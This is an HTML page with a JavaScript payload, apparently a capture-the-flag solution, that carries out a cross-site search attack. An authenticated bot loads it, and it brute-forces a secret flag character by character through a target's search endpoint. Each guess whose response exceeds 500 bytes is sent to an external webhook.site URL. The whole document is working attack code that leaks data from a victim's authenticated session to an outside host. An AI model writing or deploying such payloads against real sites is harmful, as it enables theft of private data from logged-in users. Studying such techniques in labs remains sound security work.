<!DOCTYPE html>

<body>
<script>
    // 1. Your unique Webhook.site URL
    const webhook = "https://webhook.site/14c40452-896f-4ed3-98f1-ad026e7d4a08";
    const target = "https://jtxhz6mt-3000.inc1.devtunnels.ms/search?q=";
    const alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}";
    
    // 2. Start with the known flag prefix
    let known = "FLAG{"; 

    async function leak(char) {
        const guess = known + char;
        try {
            // The bot visits the search while authenticated
            const res = await fetch(target + guess);
            const body = await res.text();
            
            // If the body is large (>500 bytes), we found a character!
            if (body.length > 500) { 
                fetch(webhook + "?found=" + encodeURIComponent(guess));
            }
        } catch (e) {}
    }

    // 3. Try every character
    alphabet.split('').forEach(leak);
</script>
